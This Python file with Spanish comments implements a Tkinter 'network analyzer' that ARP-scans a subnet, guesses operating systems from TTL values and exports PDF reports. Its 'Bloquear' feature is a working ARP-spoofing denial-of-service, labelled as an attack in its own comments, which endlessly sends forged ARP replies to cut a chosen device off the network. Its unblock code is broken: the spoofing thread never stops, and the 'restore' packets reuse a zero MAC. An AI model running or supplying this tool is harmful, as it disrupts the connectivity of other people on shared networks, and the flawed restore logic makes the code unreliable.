from scapy.all import ARP, Ether, srp, IP, ICMP, sr1, send
import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
import threading
import time
import platform
import os
import sys
import ctypes
from datetime import datetime
from reportlab.lib import colors
from reportlab.lib.pagesizes import letter
from reportlab.platypus import SimpleDocTemplate, Table, TableStyle, Paragraph
from reportlab.lib.styles import getSampleStyleSheet
import json
from pystray import Icon, Menu, MenuItem
from PIL import Image

def obtener_dispositivos_red(rango_red):
    # Construir un paquete ARP para escanear la red
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp = ARP(pdst=rango_red)
    paquete = ether / arp

    # Enviar el paquete y recibir las respuestas
    resultado = srp(paquete, timeout=2, verbose=0)[0]

    dispositivos = []
    for _, recibido in resultado:
        ttl = obtener_ttl(recibido.psrc)
        dispositivo = {
            'ip': recibido.psrc,
            'mac': recibido.hwsrc,
            'ttl': ttl,
            'os': identificar_sistema_operativo(ttl),
            'last_seen': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        dispositivos.append(dispositivo)

    return dispositivos

def obtener_ttl(ip):
    try:
        # Enviar un paquete ICMP para obtener el TTL
        respuesta = sr1(IP(dst=ip)/ICMP(), timeout=2, verbose=0)
        if respuesta is not None:
            return int(respuesta[IP].ttl)
        else:
            return None
    except Exception as e:
        print(f"Error obteniendo TTL para {ip}: {e}")
        return None

def identificar_sistema_operativo(ttl):
    if ttl is None:
        return 'Desconocido'
    elif ttl >= 128:
        return 'Windows'
    elif ttl >= 64:
        return 'Linux'
    else:
        return 'Otro'

def bloquear_dispositivo(ip_objetivo, mac_objetivo, ip_puerta_enlace):
    try:
        # Enviar paquetes ARP para redirigir el tráfico del dispositivo a ninguna parte (ataque ARP spoofing)
        while True:
            send(ARP(op=2, pdst=ip_objetivo, hwdst=mac_objetivo, psrc=ip_puerta_enlace, hwsrc="00:00:00:00:00:00"), verbose=0)
            time.sleep(2)  # Enviar paquetes cada 2 segundos para mantener el bloqueo
    except Exception as e:
        print(f"Error al bloquear dispositivo {ip_objetivo}: {e}")

def desbloquear_dispositivo(ip_objetivo, mac_objetivo, ip_puerta_enlace, mac_puerta_enlace):
    try:
        # Restaurar la tabla ARP del dispositivo con la MAC correcta del gateway
        for _ in range(5):
            send(ARP(op=2, pdst=ip_objetivo, hwdst=mac_objetivo, psrc=ip_puerta_enlace, hwsrc=mac_puerta_enlace), verbose=0)
            time.sleep(0.5)
    except Exception as e:
        print(f"Error al desbloquear dispositivo {ip_objetivo}: {e}")

def mostrar_dispositivos_gui(rango_red):
    root = tk.Tk()
    root.title("Analizador de Tráfico de Red")
    root.geometry("1200x800")

    style = ttk.Style()
    style.theme_use('clam')

    # Frame principal
    main_frame = ttk.Frame(root, padding="10")
    main_frame.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
    root.columnconfigure(0, weight=1)
    root.rowconfigure(0, weight=1)
    main_frame.columnconfigure(0, weight=1)
    main_frame.columnconfigure(1, weight=1)
    main_frame.rowconfigure(1, weight=1)

    # Controles superiores
    controls_frame = ttk.Frame(main_frame)
    controls_frame.grid(row=0, column=0, columnspan=2, sticky=(tk.W, tk.E), pady=5)
    ttk.Button(controls_frame, text="Escanear Red", command=lambda: threading.Thread(target=actualizar_dispositivos, daemon=True).start()).grid(row=0, column=0, padx=5)
    ttk.Button(controls_frame, text="Generar Reporte", command=lambda: generar_reporte()).grid(row=0, column=1, padx=5)

    # Frame izquierdo para dispositivos detectados
    left_frame = ttk.LabelFrame(main_frame, text="Dispositivos Detectados", padding="5")
    left_frame.grid(row=1, column=0, sticky=(tk.W, tk.E, tk.N, tk.S), padx=5)
    left_frame.columnconfigure(0, weight=1)
    left_frame.rowconfigure(0, weight=1)

    # Treeview para dispositivos detectados
    columns = ('IP', 'MAC', 'TTL', 'OS', 'Última Conexión')
    devices_tree = ttk.Treeview(left_frame, columns=columns, show='headings')

    # Configurar columnas
    devices_tree.heading('IP', text='Dirección IP')
    devices_tree.heading('MAC', text='Dirección MAC')
    devices_tree.heading('TTL', text='TTL')
    devices_tree.heading('OS', text='Sistema Operativo')
    devices_tree.heading('Última Conexión', text='Última Conexión')

    # Ajustar anchos de columna
    for col in columns:
        devices_tree.column(col, width=150)

    # Scrollbars para dispositivos detectados
    y_scroll = ttk.Scrollbar(left_frame, orient=tk.VERTICAL, command=devices_tree.yview)
    x_scroll = ttk.Scrollbar(left_frame, orient=tk.HORIZONTAL, command=devices_tree.xview)
    devices_tree.configure(yscrollcommand=y_scroll.set, xscrollcommand=x_scroll.set)

    # Grid para el árbol y scrollbars
    devices_tree.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
    y_scroll.grid(row=0, column=1, sticky=(tk.N, tk.S))
    x_scroll.grid(row=1, column=0, sticky=(tk.W, tk.E))

    # Frame derecho para dispositivos bloqueados
    right_frame = ttk.LabelFrame(main_frame, text="Dispositivos Bloqueados", padding="5")
    right_frame.grid(row=1, column=1, sticky=(tk.W, tk.E, tk.N, tk.S), padx=5)
    right_frame.columnconfigure(0, weight=1)
    right_frame.rowconfigure(0, weight=1)

    # Treeview para dispositivos bloqueados
    blocked_tree = ttk.Treeview(right_frame, columns=columns, show='headings')
    for col in columns:
        blocked_tree.heading(col, text=devices_tree.heading(col)['text'])
        blocked_tree.column(col, width=150)

    # Scrollbars para dispositivos bloqueados
    y_scroll_blocked = ttk.Scrollbar(right_frame, orient=tk.VERTICAL, command=blocked_tree.yview)
    x_scroll_blocked = ttk.Scrollbar(right_frame, orient=tk.HORIZONTAL, command=blocked_tree.xview)
    blocked_tree.configure(yscrollcommand=y_scroll_blocked.set, xscrollcommand=x_scroll_blocked.set)

    # Grid para el árbol y scrollbars bloqueados
    blocked_tree.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
    y_scroll_blocked.grid(row=0, column=1, sticky=(tk.N, tk.S))
    x_scroll_blocked.grid(row=1, column=0, sticky=(tk.W, tk.E))

    # Frame inferior para logs
    log_frame = ttk.LabelFrame(main_frame, text="Registro de Actividad", padding="5")
    log_frame.grid(row=2, column=0, columnspan=2, sticky=(tk.W, tk.E), pady=5)
    log_frame.columnconfigure(0, weight=1)

    log_text = scrolledtext.ScrolledText(log_frame, height=8)
    log_text.grid(row=0, column=0, sticky=(tk.W, tk.E))

    # Status bar
    status_var = tk.StringVar()
    status_var.set("Listo")
    status_bar = ttk.Label(main_frame, textvariable=status_var, relief=tk.SUNKEN)
    status_bar.grid(row=3, column=0, columnspan=2, sticky=(tk.W, tk.E))

    dispositivos_actuales = {}
    dispositivos_bloqueados = {}
    hilos_bloqueo = {}

    def actualizar_dispositivos():
        status_var.set("Escaneando la red...")
        log_text.insert(tk.END, "Iniciando escaneo de la red...\n")

        while True:
            dispositivos_nuevos = obtener_dispositivos_red(rango_red)

            # Actualizar el diccionario de dispositivos actuales
            for dispositivo in dispositivos_nuevos:
                key = (dispositivo['ip'], dispositivo['mac'])
                dispositivos_actuales[key] = dispositivo

            # Limpiar la tabla y agregar los dispositivos actualizados
            for item in devices_tree.get_children():
                devices_tree.delete(item)

            for dispositivo in dispositivos_actuales.values():
                devices_tree.insert('', tk.END, values=(dispositivo['ip'], dispositivo['mac'], dispositivo['ttl'], dispositivo['os'], dispositivo['last_seen']))

            status_var.set("Escaneo completado")
            log_text.insert(tk.END, "Escaneo completado exitosamente\n")
            time.sleep(30)  # Escanear cada 30 segundos

    def bloquear_dispositivo_seleccionado():
        seleccion = devices_tree.selection()
        if not seleccion:
            messagebox.showwarning("Advertencia", "Seleccione un dispositivo para bloquear")
            return

        item = devices_tree.item(seleccion[0])
        ip_objetivo = item['values'][0]
        mac_objetivo = item['values'][1]
        ip_puerta_enlace = "192.168.1.1"  # Cambia esto a la IP de tu puerta de enlace

        if (ip_objetivo, mac_objetivo) not in hilos_bloqueo:
            hilo = threading.Thread(target=bloquear_dispositivo, args=(ip_objetivo, mac_objetivo, ip_puerta_enlace), daemon=True)
            hilos_bloqueo[(ip_objetivo, mac_objetivo)] = hilo
            hilo.start()
            dispositivos_bloqueados[(ip_objetivo, mac_objetivo)] = dispositivos_actuales.pop((ip_objetivo, mac_objetivo))
            actualizar_listas()
            messagebox.showinfo("Info", f"Bloqueando dispositivo {ip_objetivo}")
            log_text.insert(tk.END, f"Dispositivo bloqueado: {ip_objetivo}\n")

    def desbloquear_dispositivo_seleccionado():
        seleccion = blocked_tree.selection()
        if not seleccion:
            messagebox.showwarning("Advertencia", "Seleccione un dispositivo para desbloquear")
            return

        item = blocked_tree.item(seleccion[0])
        ip_objetivo = item['values'][0]
        mac_objetivo = item['values'][1]
        ip_puerta_enlace = "192.168.1.1"  # Cambia esto a la IP de tu puerta de enlace
        mac_puerta_enlace = "00:00:00:00:00:00"  # Cambia esto a la MAC de tu puerta de enlace

        if (ip_objetivo, mac_objetivo) in hilos_bloqueo:
            del hilos_bloqueo[(ip_objetivo, mac_objetivo)]
            desbloquear_dispositivo(ip_objetivo, mac_objetivo, ip_puerta_enlace, mac_puerta_enlace)
            dispositivos_actuales[(ip_objetivo, mac_objetivo)] = dispositivos_bloqueados.pop((ip_objetivo, mac_objetivo))
            actualizar_listas()
            messagebox.showinfo("Info", f"Desbloqueando dispositivo {ip_objetivo}")
            log_text.insert(tk.END, f"Dispositivo desbloqueado: {ip_objetivo}\n")

    def actualizar_listas():
        # Limpiar y actualizar dispositivos detectados
        for item in devices_tree.get_children():
            devices_tree.delete(item)
        for dispositivo in dispositivos_actuales.values():
            devices_tree.insert('', tk.END, values=(dispositivo['ip'], dispositivo['mac'], dispositivo['ttl'], dispositivo['os'], dispositivo['last_seen']))

        # Limpiar y actualizar dispositivos bloqueados
        for item in blocked_tree.get_children():
            blocked_tree.delete(item)
        for dispositivo in dispositivos_bloqueados.values():
            blocked_tree.insert('', tk.END, values=(dispositivo['ip'], dispositivo['mac'], dispositivo['ttl'], dispositivo['os'], dispositivo['last_seen']))

    # Función para generar el reporte en PDF
    def generar_reporte():
        try:
            # Definir el nombre del archivo PDF
            reporte_pdf = f"reporte_dispositivos_{datetime.now().strftime('%Y%m%d_%H%M%S')}.pdf"
            doc = SimpleDocTemplate(reporte_pdf, pagesize=letter)
            elements = []

            # Título del reporte
            styles = getSampleStyleSheet()
            elements.append(Paragraph("Reporte de Dispositivos de Red", styles['Title']))

            # Tabla de dispositivos detectados
            elementos_detectados = [["Dirección IP", "Dirección MAC", "TTL", "Sistema Operativo", "Última Conexión"]]
            for dispositivo in dispositivos_actuales.values():
                elementos_detectados.append([dispositivo['ip'], dispositivo['mac'], dispositivo['ttl'], dispositivo['os'], dispositivo['last_seen']])

            tabla_detectados = Table(elementos_detectados)
            tabla_detectados.setStyle(TableStyle([
                ('BACKGROUND', (0, 0), (-1, 0), colors.grey),
                ('TEXTCOLOR', (0, 0), (-1, 0), colors.whitesmoke),
                ('ALIGN', (0, 0), (-1, -1), 'CENTER'),
                ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
                ('BOTTOMPADDING', (0, 0), (-1, 0), 12),
                ('BACKGROUND', (0, 1), (-1, -1), colors.beige),
                ('GRID', (0, 0), (-1, -1), 1, colors.black),
            ]))

            elements.append(Paragraph("<b>Dispositivos Permitidos</b>", styles['Heading2']))
            elements.append(tabla_detectados)

            # Tabla de dispositivos bloqueados
            elementos_bloqueados = [["Dirección IP", "Dirección MAC", "TTL", "Sistema Operativo", "Última Conexión"]]
            for dispositivo in dispositivos_bloqueados.values():
                elementos_bloqueados.append([dispositivo['ip'], dispositivo['mac'], dispositivo['ttl'], dispositivo['os'], dispositivo['last_seen']])

            tabla_bloqueados = Table(elementos_bloqueados)
            tabla_bloqueados.setStyle(TableStyle([
                ('BACKGROUND', (0, 0), (-1, 0), colors.grey),
                ('TEXTCOLOR', (0, 0), (-1, 0), colors.whitesmoke),
                ('ALIGN', (0, 0), (-1, -1), 'CENTER'),
                ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
                ('BOTTOMPADDING', (0, 0), (-1, 0), 12),
                ('BACKGROUND', (0, 1), (-1, -1), colors.lightpink),
                ('GRID', (0, 0), (-1, -1), 1, colors.black),
            ]))

            elements.append(Paragraph("<b>Dispositivos Bloqueados</b>", styles['Heading2']))
            elements.append(tabla_bloqueados)

            # Construir el PDF
            doc.build(elements)
            messagebox.showinfo("Éxito", f"Reporte generado exitosamente: {reporte_pdf}")
            log_text.insert(tk.END, f"Reporte generado: {reporte_pdf}\n")
        except Exception as e:
            messagebox.showerror("Error", f"Error al generar el reporte: {e}")
            log_text.insert(tk.END, f"Error al generar el reporte: {e}\n")

    # Botones para bloquear y desbloquear dispositivos
    ttk.Button(controls_frame, text="Bloquear Seleccionado", command=bloquear_dispositivo_seleccionado).grid(row=0, column=2, padx=5)
    ttk.Button(controls_frame, text="Desbloquear Seleccionado", command=desbloquear_dispositivo_seleccionado).grid(row=0, column=3, padx=5)

    # Ejecutar el escaneo en un hilo separado para no bloquear la interfaz
    hilo_escaneo = threading.Thread(target=actualizar_dispositivos, daemon=True)
    hilo_escaneo.start()

    # Iniciar el ícono de la bandeja del sistema
    def iniciar_tray_icon():
        icon_image = Image.open("app.ico")  # Debes proporcionar un ícono
        menu = Menu(MenuItem("Salir", lambda icon, item: icon.stop()))
        tray_icon = Icon("NetworkAnalyzer", icon_image, menu=menu)
        tray_icon.run()

    hilo_tray = threading.Thread(target=iniciar_tray_icon, daemon=True)
    hilo_tray.start()

    root.mainloop()

def imprimir_dispositivos(dispositivos):
    for dispositivo in dispositivos:
        print(f"IP: {dispositivo['ip']}, MAC: {dispositivo['mac']}, TTL: {dispositivo['ttl']}, OS: {dispositivo['os']}, Última Conexión: {dispositivo['last_seen']}")

if __name__ == "__main__":
    rango_red = "192.168.1.0/24"  # Cambia esto al rango de red que quieres escanear
    mostrar_dispositivos_gui(rango_red)
